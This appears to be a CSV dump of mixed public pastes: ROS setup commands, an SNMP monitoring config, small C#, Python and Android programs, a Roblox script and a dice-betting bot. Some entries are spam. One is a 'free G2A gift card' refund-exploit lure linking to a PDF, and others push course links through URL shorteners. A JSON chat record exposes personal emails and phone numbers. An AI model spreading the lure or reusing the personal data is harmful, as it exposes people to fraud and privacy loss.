id,title,username,language,date,content
dVSqAD4Y,data846,TestGuy1,JSON,Tuesday 20th of February 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'aba99dfd9435bfc282186fa4fc892134d2881e7b3d2bae8c769059cb2fa71e625a9c3e3df9c6c12c43a245f938b5822ded1a7ecb36493be9ce5770645618556eb703abe4fa90befc3b79830a1f98e0b7d4a67a3b4499135d79839067149fca7326a4dc016dcf81a8fd6e2bce46aab49d4011d7d63c9ecdac5601110bdfe7691f',
  otherdata: [
    '0cc08bbaec75a1998e66c4e62d181c39',
    '161403120a14362348e9c773682cee0e',
    '50fa74a99079c855efb1c2082796b510',
    '962f4dbb47c1dfc731d64c43a601fed8',
    'abc92b280371ac61a5ae0e62b49e4b4b',
    '0845ba58e0e52367e966a8cf4429c06b',
    '4362fd1f6a0ce71fea8226eda1de3b17',
    '7c7be8b72ecfc50e5145b9fcc45cc7b7'
  ]
}"
V3WMCfMt,Catkin workspace configuration,LorenzoPagliara,Bash,Tuesday 20th of February 2024 05:56:36 AM CDT,"echo ""source /opt/ros/noetic/setup.bash"" >> ~/.bashrc
source ~/.bashrc

cd
mkdir -p ~/catkin_ws/src
cd ~/catkin_ws/
catkin config --extend /opt/ros/$ROS_DISTRO/ --cmake-args -DCMAKE_BUILD_TYPE=Release
catkin init
catkin build

echo ""source ~/catkin_ws/devel/setup.bash"" >> ~/.bashrc
source ~/.bashrc"
TtC15fwE,generatorv3,G0nz0uk,YAML,Tuesday 20th of February 2024 05:51:04 AM CDT,"# Define the SNMP version and authentication details.
auths:
  dell_idrac:
    version: 2
    community: public123  # Assuming SNMPv2c with community string ""public123""
  cisco_v2:
    version: 2
    community: test1
  aruba_v2:
    version: 2
    community: test12
  extreme_v2:
    version: 2
    community: test123 



# Define the module for collecting specific metrics.
modules:
  # Default IF-MIB interfaces table with ifIndex.
  if_mib:
    walk: [sysUpTime, interfaces, ifXTable]
    lookups:
      - source_indexes: [ifIndex]
        lookup: ifAlias
      - source_indexes: [ifIndex]
        # Uis OID to avoid conflict with PaloAlto PAN-COMMON-MIB.
        lookup: 1.3.6.1.2.1.2.2.1.2 # ifDescr
      - source_indexes: [ifIndex]
        # Use OID to avoid conflict with Netscaler NS-ROOT-MIB.
        lookup: 1.3.6.1.2.1.31.1.1.1.1 # ifName
    overrides:
      ifAlias:
        ignore: true # Lookup metric
      ifDescr:
        ignore: true # Lookup metric
      ifName:
        ignore: true # Lookup metric
      ifType:
        type: EnumAsInfo
  dell_idrac:  # Rename ""my_device_metrics"" to something more descriptive for your use case
    walk:
      - .1.3.6.1.4.1.674.10892.5.4.700.20.1.6.1.3  # CPU1 Temperature
      - .1.3.6.1.4.1.674.10892.5.4.700.20.1.6.1.4  # CPU2 Temperature
      - .1.3.6.1.4.1.674.10892.5.4.700.12.1.6.1.1  # Fan1 Speed
      - .1.3.6.1.4.1.674.10892.5.4.700.12.1.6.1.2  # Fan2 Speed
      - .1.3.6.1.4.1.674.10892.5.4.700.12.1.6.1.3  # Fan3 Speed
      - .1.3.6.1.4.1.674.10892.5.4.700.12.1.6.1.4  # Fan4 Speed
    max_repetitions: 25
    retries: 3
    timeout: 5s
    lookups:
      # Example lookup configuration - customize as needed based on your OIDs
      # This section is more relevant if you're referencing a table and want to correlate indices with meaningful labels.
    overrides:
      # Here you can override specific MIBs or metrics behaviors
      cpu1_temp:
        ignore: false
        type: gauge
      cpu2_temp:
        ignore: false
        type: gauge
      fan1_speed:
        ignore: false
        type: gauge
      fan2_speed:
        ignore: false
        type: gauge
      fan3_speed:
        ignore: false
        type: gauge
      fan4_speed:
        ignore: false
        type: gauge"
XMBNrSqx,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Tuesday 20th of February 2024 05:41:20 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_324382.pdf

Working as of:
20 February 2024"
iff3A5ck,Untitled,bonky_katto,Python,Tuesday 20th of February 2024 05:13:58 AM CDT,"from math import log

def mult(a: float, b: float) -> float:
    #making sure calculation of negative value is possible
    sign = 1
    if a<0 or b<0:
        if a<0 and b<0:
            sign = 1
        else:
            sign = -1
        a = abs(a)
        b = abs(b)
    
    #taking the log_2 of both values
    a_log = log(a,2) 
    b_log = log(b,2)

    #adding log values
    c_log = a_log+b_log

    #converting to normal values and returning
    c = 2**c_log
    return c*sign

def div(a: float, b: float) -> float:
    #making sure calculation of negative value is possible
    sign = 1
    if a<0 or b<0:
        if a<0 and b<0:
            sign = 1
        else:
            sign = -1
        a = abs(a)
        b = abs(b)
    
    #taking the log_2 of both values
    a_log = log(a,2) 
    b_log = log(b,2)

    #substracting log values
    c_log = a_log-b_log

    #converting to normal values and returning
    c = 2**c_log
    return c*sign"
AqcKkC1E,Review Range Markets,fxvnpro,PHP,Tuesday 20th of February 2024 04:39:19 AM CDT,https://www.fxvnpro.com/review-range-markets/
Dh2yCXbp,DynamicArray,UrayFenn,C#,Tuesday 20th of February 2024 04:33:56 AM CDT,"namespace DynamicArray
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = new int[0];
            string commandSum = ""sum"";
            string commandExit = ""exit"";
            bool isOpen = true;

            while (isOpen)
            {
                for (int i = 0; i < numbers.Length; i++)
                {

                    Console.Write(numbers[i] + "" "");
                }

                Console.WriteLine(""\n\nВведите желаемое число:"");
                Console.WriteLine($""Для сложения введенных чисел введите: {commandSum}"");
                Console.WriteLine($""Для выхода из программы введите: {commandExit}"");
                string userInput = Console.ReadLine();

                if (userInput == ""sum"")
                {
                    int sumArray = 0;

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        sumArray += numbers[i];
                    }

                    Console.WriteLine($""Сумма введенный чисел: {sumArray}"");
                }
                else if (userInput == ""exit"")
                {
                    Console.WriteLine(""Вы вышли из программы!"");
                    isOpen = false;
                }
                else
                {
                    int[] numbersCopy = new int[numbers.Length + 1];
                    int inputNumber = Convert.ToInt32(userInput);
                    numbersCopy[numbersCopy.Length - 1] = inputNumber;

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        numbersCopy[i] = numbers[i];
                    }

                    numbers = numbersCopy;
                    Console.WriteLine(""\nЧисло добавлено!"");
                }
            }
        }
    }
}"
ZACVgCCQ,Untitled,sissou123,C,Tuesday 20th of February 2024 04:27:11 AM CDT,"Advanced C Programming Course
Become a True Master of the C Programming Language - Confidently Apply for Real Time or Embedded C Jobs or contracts! 
What you'll learn
Understand and be able to apply advanced concepts of the C programming language to create advanced C applications. 
for more:https://d-aa.com/sTfCt
"
gnMK2vby,Untitled,sissou123,C,Tuesday 20th of February 2024 04:17:47 AM CDT,"C Programming For Beginners - Master the C Language
C Programming will increase career options. Become a better dev in other languages by learning C. Pointers explained 
What you'll learn
Understand the fundamentals of the C Programming Language
Make yourself more marketable for entry level programming positions 
for more:https://cuty.io/KSzPa0NN2
"
Ws9zvGMS,prevent ad overflow,petar_bonov,CSS,Tuesday 20th of February 2024 04:09:14 AM CDT,".pgAdWrapper:has(#gsmarenacom46956) {
    overflow: hidden;
}"
mACdpqmq,Untitled,sissou123,JavaScript,Tuesday 20th of February 2024 03:56:42 AM CDT,"Modern JavaScript From The Beginning 2.0 (2024)
A 36-hour master course to take you from beginner to advanced JavaScript 
What you'll learn
Learn the Fundamentals (Variables, Loops, Functions, etc)
Learn How JavaScript Works (Execution Context, Call Stack, Async JS) 
for more:https://cuty.io/YwYEfuzGjw
"
Gews99YW,[MUF] Detail Chatroom,ffajarpratama,JSON,Tuesday 20th of February 2024 03:53:55 AM CDT,"{
    ""success"": true,
    ""data"": {
        ""chatroom_id"": ""375e9ce4-9625-43cd-a1ff-8aa6133a1450"",
        ""firestore_room_id"": ""string"",
        ""sender_id"": ""64d63e2a-f459-45cf-9d63-2289e642b58d"",
        ""receiver_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
        ""type"": ""user-vehicle"",
        ""user_vehicle_id"": ""dfe5c5ba-286b-48d7-8c6e-6be809bf9146"",
        ""last_message"": ""pagi bg"",
        ""last_message_at"": 1708416000,
        ""last_message_by"": ""64d63e2a-f459-45cf-9d63-2289e642b58d"",
        ""sender_read_at"": 1708422752,
        ""receiver_read_at"": 0,
        ""ended_at"": 0,
        ""ended_by"": null,
        ""created_at"": 1708419260,
        ""updated_at"": 1708422752,
        ""deleted_at"": 0,
        ""is_vehicle_available"": true,
        ""sender"": {
            ""user_id"": ""64d63e2a-f459-45cf-9d63-2289e642b58d"",
            ""name"": ""Fajar Pratama"",
            ""email"": ""fajarpratama.dev@gmail.com"",
            ""phone_number"": ""6282243089903"",
            ""last_login_at"": 0,
            ""last_seen_at"": 0,
            ""verified_at"": 1698295851,
            ""register_source"": ""phone number"",
            ""created_at"": 1698295425,
            ""updated_at"": 1708418970,
            ""deleted_at"": 0,
            ""user_info"": null,
            ""user_roles"": null,
            ""user_dealer"": null,
            ""has_pin"": false,
            ""dealer"": null
        },
        ""receiver"": {
            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
            ""name"": ""Gorengan"",
            ""email"": ""mufkalif18@gmail.com"",
            ""phone_number"": ""62888999666"",
            ""last_login_at"": 0,
            ""last_seen_at"": 0,
            ""verified_at"": 1695352377,
            ""register_source"": ""google"",
            ""created_at"": 1695350727,
            ""updated_at"": 1708310898,
            ""deleted_at"": 0,
            ""user_info"": null,
            ""user_roles"": null,
            ""user_dealer"": null,
            ""has_pin"": false,
            ""dealer"": null
        },
        ""user_vehicle"": {
            ""user_vehicle_id"": ""dfe5c5ba-286b-48d7-8c6e-6be809bf9146"",
            ""city_id"": ""066ab7cc-167b-4548-8327-26135d393c60"",
            ""vehicle_brand_id"": ""e44f5c4b-d013-4330-9b06-d1a9105fa289"",
            ""vehicle_variant_id"": ""879821d3-f6b5-4482-ada2-471b0ce3fa23"",
            ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
            ""vehicle_color_id"": ""2a69d4a6-025e-4135-84a8-3e3b5fd417ea"",
            ""vehicle_series_id"": ""0e1e1785-5d8a-4a1c-b659-6372aa9b6b42"",
            ""year"": 2021,
            ""license_plate"": ""AD"",
            ""is_plate_number_even"": true,
            ""odometer"": 23232,
            ""ownership_status"": ""company"",
            ""ac_condition"": ""tidak dingin"",
            ""tyre_condition"": ""80 - 89%"",
            ""body_condition"": ""Baret ringan"",
            ""flood_damage"": false,
            ""registration_validity_period"": ""05-2021"",
            ""description"": ""dealer"",
            ""price"": 323233000,
            ""type"": ""dealer"",
            ""created_by"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
            ""dealer_id"": ""79ce28ec-fb5b-4e0f-a54d-9013c081f807"",
            ""approved_by"": null,
            ""approved_at"": 0,
            ""updated_by"": ""6fc8e022-bbd0-4656-9a01-9730cf41c08b"",
            ""status"": ""approved"",
            ""reason"": """",
            ""is_recommended"": true,
            ""is_popular"": true,
            ""is_trending"": false,
            ""created_at"": 1704450291,
            ""updated_at"": 1706080869,
            ""deleted_at"": 0,
            ""city"": null,
            ""vehicle_brand"": {
                ""vehicle_brand_id"": ""e44f5c4b-d013-4330-9b06-d1a9105fa289"",
                ""name"": ""PEUGEOT"",
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""code"": ""01K"",
                ""media_id"": ""82c70d73-676c-458c-a708-c7857b5ad907"",
                ""created_at"": 1691577703,
                ""updated_at"": 1691577703,
                ""deleted_at"": 0,
                ""vehicle_group"": null,
                ""media"": null
            },
            ""vehicle_variant"": {
                ""vehicle_variant_id"": ""879821d3-f6b5-4482-ada2-471b0ce3fa23"",
                ""name"": ""Active"",
                ""vehicle_series_id"": ""0e1e1785-5d8a-4a1c-b659-6372aa9b6b42"",
                ""vehicle_brand_id"": ""e44f5c4b-d013-4330-9b06-d1a9105fa289"",
                ""vehicle_category_id"": ""200a50b3-3a13-485e-9c49-2c56b6c4fe33"",
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""vehicle_fuel_id"": ""7f5ceae2-24ff-4add-a3ca-97352cb1443f"",
                ""vehicle_transmission_id"": ""82abe17b-8e07-45ac-a92f-c04e40818117"",
                ""vehicle_type_id"": ""b32b65cb-3a97-4bfb-bf24-07f7cd07457d"",
                ""code"": """",
                ""moas_id"": null,
                ""is_recommended"": false,
                ""is_popular"": false,
                ""is_trending"": false,
                ""created_at"": 1701253610,
                ""updated_at"": 1701253610,
                ""deleted_at"": 0,
                ""all_specs"": null,
                ""vehicle_series"": null,
                ""vehicle_brand"": null,
                ""vehicle_category"": null,
                ""vehicle_group"": null,
                ""vehicle_fuel"": null,
                ""vehicle_transmission"": null,
                ""vehicle_specs"": null,
                ""vehicle_otr"": null,
                ""vehicle_type"": null
            },
            ""vehicle_type"": {
                ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
                ""name"": ""Mobil Bekas"",
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""code"": ""004"",
                ""created_at"": 0,
                ""updated_at"": 0,
                ""deleted_at"": 0,
                ""vehicle_group"": null
            },
            ""vehicle_color"": null,
            ""vehicle_series"": {
                ""vehicle_series_id"": ""0e1e1785-5d8a-4a1c-b659-6372aa9b6b42"",
                ""name"": ""5008"",
                ""vehicle_brand_id"": ""e44f5c4b-d013-4330-9b06-d1a9105fa289"",
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""code"": """",
                ""created_at"": 1701242399,
                ""updated_at"": 1701242399,
                ""deleted_at"": 0,
                ""min_price"": 0,
                ""max_price"": 0,
                ""domicile_name"": """",
                ""wishlisted"": false,
                ""vehicle_brand"": null,
                ""vehicle_group"": null,
                ""vehicle_otrs"": null
            },
            ""created_by_user"": null,
            ""dealer"": null,
            ""approved_by_user"": null,
            ""updated_by_user"": null,
            ""vehicle_images"": null,
            ""history_status"": null,
            ""user_dealer"": null,
            ""wishlisted"": false
        },
        ""last_message_by_user"": {
            ""user_id"": ""64d63e2a-f459-45cf-9d63-2289e642b58d"",
            ""name"": ""Fajar Pratama"",
            ""email"": ""fajarpratama.dev@gmail.com"",
            ""phone_number"": ""6282243089903"",
            ""last_login_at"": 0,
            ""last_seen_at"": 0,
            ""verified_at"": 1698295851,
            ""register_source"": ""phone number"",
            ""created_at"": 1698295425,
            ""updated_at"": 1708418970,
            ""deleted_at"": 0,
            ""user_info"": null,
            ""user_roles"": null,
            ""user_dealer"": null,
            ""has_pin"": false,
            ""dealer"": null
        },
        ""ended_by_user"": null
    },
    ""message"": ""Success"",
    ""errors"": null
}"
HBfNT2qn,Untitled,sissou123,JavaScript,Tuesday 20th of February 2024 03:07:10 AM CDT,"Modern JavaScript From The Beginning 2.0 (2024)
A 36-hour master course to take you from beginner to advanced JavaScript
What you'll learn
Learn the Fundamentals (Variables, Loops, Functions, etc)
Learn How JavaScript Works (Execution Context, Call Stack, Async JS) 
for more:https://dz-linkk.com/h07aFj
"
PxKh1sFn,Untitled,ssaaabbss,Lua,Tuesday 20th of February 2024 02:46:05 AM CDT,"local player = game.Players.danya23131
local character = player.Character
local tween = game:GetService(""TweenService"")
character.Humanoid.MaxHealth = math.huge
character.Humanoid.Health = math.huge
--[[
for i,v in pairs(character:GetDescendants()) do
	if v:IsA(""BasePart"") then
		v.Color = Color3.fromRGB(0,0,0)
	end
	if v:IsA(""Accessory"") then
		v:Remove()
	end
	if v:IsA(""Shirt"") then
		v:Remove()
	end
	if v:IsA(""Pants"") then
		v:Remove()
	end
end
]]
local sound = Instance.new(""Sound"", character[""HumanoidRootPart""])
sound.SoundId = ""rbxassetid://1080610583""
sound.Volume = 2
sound.Looped = true
local intro = Instance.new(""Sound"", character[""HumanoidRootPart""])
intro.SoundId = ""rbxassetid://2566176562""
intro.Volume = 4
intro:Play()
spawn(function()
	task.wait(5)
	intro:Remove()
end)
local weld = Instance.new(""Weld"", character[""Left Arm""])
weld.Part0 = character[""Left Arm""]
weld.Part1 = character[""Torso""]
local change1 = {
	C0 = CFrame.new(Vector3.new(0.5,2,0)) * CFrame.fromEulerAnglesXYZ(0,0,math.rad(90))
}
local tw1 = tween:Create(weld, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out,0,false,0),change1)
tw1:Play()
--weld.C0 = CFrame.new(Vector3.new(-0.5,2,0)) * CFrame.fromEulerAnglesXYZ(0,0,math.rad(-90))

local weld2 = Instance.new(""Weld"", character[""Right Arm""])
weld2.Part0 = character[""Right Arm""]
weld2.Part1 = character[""Torso""]

local change2 = {
	C0 = CFrame.new(Vector3.new(-0.5,2,0)) * CFrame.fromEulerAnglesXYZ(0,0,math.rad(-90))
}
local tw2 = tween:Create(weld2, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out,0,false,0),change2)
tw2:Play()
--weld2.C0 = CFrame.new(Vector3.new(-0.5,2,0)) * CFrame.fromEulerAnglesXYZ(0,0,math.rad(-90))

local weld3 = Instance.new(""Weld"", character[""Left Leg""])
weld3.Part0 = character[""Left Leg""]
weld3.Part1 = character[""Torso""]
local change3 = {
	C0 = CFrame.new(Vector3.new(-0.5,2,0)) * CFrame.fromEulerAnglesXYZ(0,0,0)
}
local tw3 = tween:Create(weld3, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out,0,false,0),change3)
tw3:Play()
--weld3.C0 = CFrame.new(Vector3.new(-.5,2,0))

local weld4 = Instance.new(""Weld"", character[""Right Leg""])

weld4.Part0 = character[""Right Leg""]
weld4.Part1 = character[""Torso""]
local change4 = {
	C0 = CFrame.new(Vector3.new(0.5,2,0)) * CFrame.fromEulerAnglesXYZ(0,0,0)
}
local tw4 = tween:Create(weld4, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out,0,false,0),change4)
tw4:Play()
--weld4.C0 = CFrame.new(Vector3.new(.5,2,0))

local weld5 = Instance.new(""Weld"", character[""Torso""])

weld5.Part0 = character[""Torso""]
weld5.Part1 = character[""HumanoidRootPart""]

local weld6 = Instance.new(""Weld"", character[""Head""])

weld6.Part0 = character[""Head""]
weld6.Part1 = character[""Torso""]
--weld6.C0 = CFrame.new(Vector3.new(0,-1.5,0))
local change6 = {
	C0 = CFrame.new(Vector3.new(0,-1.5,0)) * CFrame.fromEulerAnglesXYZ(0,0,0)
}
local tw6 = tween:Create(weld6, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out,0,false,0),change6)
tw6:Play()

task.wait(0.6)

spawn(function()
	local reserve = weld.C0
	local reserve2 = weld2.C0
	local reserve3 = weld3.C0
	local reserve4 = weld4.C0
	local reserve5 = weld5.C0
	local reserve6 = weld6.C0
	while true do
		task.wait()
		if character[""Humanoid""].MoveDirection.Magnitude > 0 then
			sound:Resume()
			weld.C0 = reserve * CFrame.new(Vector3.new(math.random(-20,20)/100,math.random(-20,20)/100,math.random(-20,20)/100))
			weld2.C0 = reserve2 * CFrame.new(Vector3.new(math.random(-20,20)/100,math.random(-20,20)/100,math.random(-20,20)/100))
			weld3.C0 = reserve3 * CFrame.new(Vector3.new(math.random(-20,20)/100,math.random(-20,20)/100,math.random(-20,20)/100))
			weld4.C0 = reserve4 * CFrame.new(Vector3.new(math.random(-20,20)/100,math.random(-20,20)/100,math.random(-20,20)/100))
			weld5.C0 = reserve5 * CFrame.new(Vector3.new(math.random(-20,20)/100,math.random(-20,20)/100,math.random(-20,20)/100))
			weld6.C0 = reserve6 * CFrame.new(Vector3.new(math.random(-20,20)/100,math.random(-20,20)/100,math.random(-20,20)/100))
		else
			sound:Pause()
			sound.Pitch = math.random(80,120)/100
			weld.C0 = reserve
			weld2.C0 = reserve2
			weld3.C0 = reserve3
			weld4.C0 = reserve4
			weld5.C0 = reserve5
			weld6.C0 = reserve6
		end
	end
end)"
gMEFevv1,Untitled,575,Java,Tuesday 20th of February 2024 02:19:00 AM CDT,"package com.example.geometry;

import android.net.Uri;
import android.os.Bundle;
import android.widget.ImageButton;
import android.widget.MediaController;
import android.widget.VideoView;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.content.Intent;
import android.widget.Toast;
import android.widget.EditText;



public class task1 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_task1);

        VideoView videoView = findViewById(R.id.videoView1);
        String videoPath = ""android.resource://"" + getPackageName() + ""/"" + R.raw.vid1;
        Uri uri = Uri.parse(videoPath);
        videoView.setVideoURI(uri);

        MediaController mediaController = new MediaController(this);
        videoView.setMediaController(mediaController);
        mediaController.setAnchorView(videoView);

        ImageButton buttonGoToMain = findViewById(R.id.buttonHome);
        ImageButton buttonGoToCatalogue = findViewById(R.id.buttonTasks);


        buttonGoToMain.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(task1.this, MainActivity.class);
                startActivity(intent);
            }
        });

        buttonGoToCatalogue.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(task1.this, task_catalogue.class);
                startActivity(intent);
            }
        });

        EditText answerInput = findViewById(R.id.answerInput);

        findViewById(R.id.submitButton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String answer = answerInput.getText().toString();
                if (""57"".equals(answer)) {
                    Toast.makeText(task1.this, ""Правильный ответ!"", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(task1.this, ""Неправильный ответ, попробуйте еще раз."", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }
}
"
7Yz0DbgE,Untitled,575,XML,Tuesday 20th of February 2024 02:17:23 AM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android=""http://schemas.android.com/apk/res/android""
    xmlns:app=""http://schemas.android.com/apk/res-auto""
    xmlns:tools=""http://schemas.android.com/tools""
    android:layout_width=""match_parent""
    android:layout_height=""match_parent""
    android:padding=""16dp"">

    <include
        android:id=""@+id/include_main_buttons""
        layout=""@layout/main_buttons_layout""
        android:layout_width=""match_parent""
        android:layout_height=""wrap_content""
        android:layout_alignParentBottom=""true""
        android:layout_marginTop=""296dp""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintTop_toBottomOf=""@+id/videoView1"" />

    <TextView
        android:id=""@+id/taskNumber""
        android:layout_width=""wrap_content""
        android:layout_height=""wrap_content""
        android:text=""Задача 1""
        android:textSize=""24sp""
        android:textStyle=""bold""
        app:layout_constraintTop_toTopOf=""parent""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintEnd_toEndOf=""parent""/>

    <TextView
        android:id=""@+id/taskDescription""
        android:layout_width=""0dp""
        android:layout_height=""wrap_content""
        android:text=""Цилиндр описан около шара. Объем шара равен 38. Найдите объем цилиндра.""
        android:textSize=""18sp""
        app:layout_constraintTop_toBottomOf=""@id/taskNumber""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintEnd_toEndOf=""parent""
        android:layout_marginTop=""8dp""/>

    <VideoView
        android:id=""@+id/videoView1""
        android:layout_width=""0dp""
        android:layout_height=""200dp""
        app:layout_constraintTop_toBottomOf=""@id/taskDescription""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintEnd_toEndOf=""parent""
        android:layout_marginTop=""16dp""/>

    <EditText
        android:id=""@+id/answerInput""
        android:layout_width=""0dp""
        android:layout_height=""wrap_content""
        android:minHeight=""48dp""
        android:hint=""Введите ваш ответ здесь""
        app:layout_constraintTop_toBottomOf=""@id/videoView1""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintEnd_toEndOf=""parent""
        android:layout_marginTop=""16dp""
        android:paddingTop=""12dp""
        android:paddingBottom=""12dp""/>

    <include
        android:id=""@+id/include_main_buttons""
        layout=""@layout/main_buttons_layout""
        android:layout_width=""match_parent""
        android:layout_height=""wrap_content""
        android:layout_marginTop=""16dp""
        app:layout_constraintBottom_toBottomOf=""parent""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintEnd_toEndOf=""parent""/>

    <Button
        android:id=""@+id/submitButton""
        android:layout_width=""wrap_content""
        android:layout_height=""wrap_content""
        android:text=""Проверить ответ""
        app:layout_constraintTop_toBottomOf=""@id/answerInput""
        app:layout_constraintStart_toStartOf=""parent""
        app:layout_constraintEnd_toEndOf=""parent""
        android:layout_marginTop=""16dp""/>

</androidx.constraintlayout.widget.ConstraintLayout>
"
NpkWnYT0,snowzy bot supersnowzy strikes back,coinwalk,JavaScript,Tuesday 20th of February 2024 02:13:47 AM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var dockiez = original;
var madman = Number((original/320).toFixed(8));
var tens = (madman*10);
var sevens = (madman*6.9);
var eights = (madman*7.9);
var fran = madman;
var norbble = original;
var james = ((Math.floor(original/tens))*tens);
var filfy = ((Math.floor(original/tens))*tens);
var stinky = 6.9;
var smelly = 2.9;
var fart = 1;
 
function dobet(){
norbble = parseFloat(document.getElementById('pct_balance').value);
if (norbble>(filfy+(fran*stinky))){
    stinky = 4.9;
    smelly = 4.9;
    fran = fran*2;
    filfy = parseFloat(norbble);
}  
if (norbble<(filfy-(fran*smelly))){
    stinky = 4.9;
    smelly = 4.9;
    fran = fran*2;
    filfy = parseFloat(norbble);
}
if ((norbble>(james+tens))&&(norbble<(((Math.floor(norbble/tens))*tens)+sevens))){
    stinky = 6.9;
    smelly = 2.9;
    fran = madman;
    filfy = ((Math.floor(norbble/tens))*tens);
    james = ((Math.floor(norbble/tens))*tens);
}
if ((norbble>(james+tens))&&(norbble>(((Math.floor(norbble/tens))*tens)+eights))){
    stinky = 6.9;
    smelly = 2.9;
    fran = madman;
    filfy = ((Math.floor(norbble/tens))*tens);
    james = ((Math.floor(norbble/tens))*tens);
}
if ((norbble>(james+tens))&&(norbble>(((Math.floor(norbble/tens))*tens)+sevens))&&(norbble<(((Math.floor(norbble/tens))*tens)+eights))){
    stinky = 4.9;
    smelly = 4.9;
    fran = madman*2;
    filfy = parseFloat(norbble);
    james = ((Math.floor(norbble/tens))*tens);
}
if (((norbble-(fran*2))<=(james-tens))&&(norbble<(((Math.floor(norbble/tens))*tens)+sevens))){
    stinky = 6.9;
    smelly = 2.9;
    fran = madman;
    filfy = ((Math.floor(norbble/tens))*tens);
    james = ((Math.floor(norbble/tens))*tens);
} 
if (((norbble-(fran*2))<=(james-tens))&&(norbble>(((Math.floor(norbble/tens))*tens)+eights))){
    stinky = 6.9;
    smelly = 2.9;
    fran = madman;
    filfy = ((Math.floor(norbble/tens))*tens);
    james = ((Math.floor(norbble/tens))*tens);
}
if (((norbble-(fran*2))<=(james-tens))&&(norbble>(((Math.floor(norbble/tens))*tens)+sevens))&&(norbble<(((Math.floor(norbble/tens))*tens)+eights))){
    stinky = 4.9;
    smelly = 4.9;
    fran = madman*2;
    filfy = parseFloat(norbble);
    james = ((Math.floor(norbble/tens))*tens);
}
if (norbble>=(original*24)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((fran*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => dobet(), 1);
} 
dobet();
"
c5gsU9Uz,LocalMaximum2,UrayFenn,C#,Tuesday 20th of February 2024 02:12:02 AM CDT,"namespace LocalMaximum
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int arrayLength = 30;
            int minNumber = -30;
            int maxNumber = 30;
            string localMaxima = "" "";
            Random random = new Random();
            int[] numbers = new int[arrayLength];

            for (int i = 0; i < numbers.Length; i++)
            {
                numbers[i] = random.Next(minNumber, maxNumber);
                Console.Write(numbers[i] + "" "");
            }

            if (numbers[0] > numbers[1])
            {
                localMaxima += numbers[0] + "" "";
            }

            for (int i = 1; i < arrayLength - 1; ++i)
            {
                if (numbers[i - 1] < numbers[i] && numbers[i + 1] < numbers[i])
                {
                    localMaxima += numbers[i] + "" "";
                }
            }

            int indexLastElement = numbers.Length - 1;

            if (numbers[indexLastElement] > numbers[indexLastElement] - 1)
            {
                localMaxima += numbers[numbers.Length - 1] + "" "";
            }

            Console.WriteLine(""\nЛокальные максимумы: "" + localMaxima );
        }
    }
}"
ypE9iT8p,assignment1,anik11556,Python,Tuesday 20th of February 2024 02:10:54 AM CDT,"import osmnx as ox
import random
import networkx as nx
import heapq
import time
from tabulate import tabulate
import matplotlib.pyplot as plt



list1 = []
list2 = []
list3 = []
risk_values = []
risk_iterator = 0
node_pairs = []
risk_values = []

def hstd(node1, node2):
    global risk_iterator  
    hstd_value = ox.distance.euclidean_dist_vec(graph.nodes[node1]['y'], graph.nodes[node1]['x'],
                                                 graph.nodes[node2]['y'], graph.nodes[node2]['x'])
    


    try:
        # Get the index of node1 and node2 from the node_pairs list
        index = node_pairs.index((node1, node2))
        risk_value = risk_values[index]
    except ValueError:  # Handle the case when the index is not found
        risk_value = 100000
    # index = node_pairs.index((node1, node2))
    
    # Find the risk value corresponding to the index
    # risk_value = risk_values[index]

   
    
    #print(node1)
    #risk_value = random.uniform(0, 500)
    
    retValue = hstd_value + risk_value
    #print(retValue)
    # # Append the risk value to a file
    # with open(""risk.txt"", ""a"") as f:
    #     f.write(str(risk_value) + ""\n"")
    
    
    # risk_value = risk_values[risk_iterator]
    
    # # Increment the risk iterator and loop back to the beginning if necessary
    # risk_iterator = (risk_iterator + 1) % len(risk_values)
    return retValue

